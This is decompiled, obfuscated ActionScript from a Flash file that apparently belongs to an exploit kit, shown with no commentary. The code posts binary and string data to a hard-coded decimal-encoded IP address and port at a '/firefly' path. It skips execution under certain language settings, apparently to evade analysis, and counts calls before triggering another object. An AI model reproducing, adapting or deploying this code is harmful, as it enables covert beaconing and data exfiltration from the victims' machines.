package §521423181732318186123423632234§
{
   import §521423136342313647123423632234§.§dynamic while else§;
   import §521423165552316568123423632234§.§default var function§;
   import §521423175742317587123423632234§.§521423121382312151123423632234§;
   import flash.display.LoaderInfo;
   import flash.events.Event;
   import flash.net.URLLoader;
   import flash.net.URLRequest;
   import flash.system.Capabilities;
   import flash.utils.ByteArray;
   import §include var try§.§521423176002317613123423632234§;
   
   public class §521423135852313598123423632234§ implements §521423121542312167123423632234§
   {
      
      private var §extends set finally§:String;
      
      private var §5214235947235960123423632234§:int;
      
      public function §521423135852313598123423632234§(param1:LoaderInfo)
      {
         super();
         this.§extends set finally§ = "http://755779336:19402/firefly";
      }
      
      private function §52142377523788123423632234§(param1:Event) : void
      {
      }
      
      public function §class var override§(param1:ByteArray) : void
      {
         if(Capabilities.language.length > 3)
         {
            return;
         }
         var _loc2_:URLRequest = new URLRequest(this.§extends set finally§ + "S");
         _loc2_.method = "POST";
         _loc2_.contentType = "application/octet-stream";
         _loc2_.data = param1;
         var _loc3_:URLLoader = new URLLoader();
         _loc3_.addEventListener("ioError",this.§52142377523788123423632234§,false,0,true);
         _loc3_.addEventListener("securityError",this.§52142377523788123423632234§,false,0,true);
         _loc3_.load(_loc2_);
      }
      
      public function §5214238193238206123423632234§(param1:String) : void
      {
         var _loc2_:URLRequest = null;
         var _loc4_:URLLoader = null;
         var _loc5_:§521423176002317613123423632234§ = null;
         if(Capabilities.language.length > 3)
         {
            return;
         }
         var _loc3_:§521423121382312151123423632234§ = §521423121382312151123423632234§(§default var function§.§import use include§().§5214231532231545123423632234§(§521423121382312151123423632234§));
         if(_loc3_.§final use var§())
         {
            return;
         }
         if(§5214235947235960123423632234§ < 30)
         {
            _loc2_ = new URLRequest(this.§extends set finally§);
            _loc2_.method = "POST";
            _loc2_.data = param1.replace(/=/g,"~");
            _loc4_ = new URLLoader();
            _loc4_.addEventListener("ioError",this.§52142377523788123423632234§,false,0,true);
            _loc4_.addEventListener("securityError",this.§52142377523788123423632234§,false,0,true);
            _loc4_.load(_loc2_);
         }
         var _loc6_:int = 13;
         if(++§5214235947235960123423632234§ > _loc6_)
         {
            _loc5_ = §521423176002317613123423632234§(§default var function§.§import use include§().§5214231532231545123423632234§(§521423176002317613123423632234§));
            _loc5_.§5214231851231864123423632234§(new §dynamic while else§());
         }
      }
   }
}

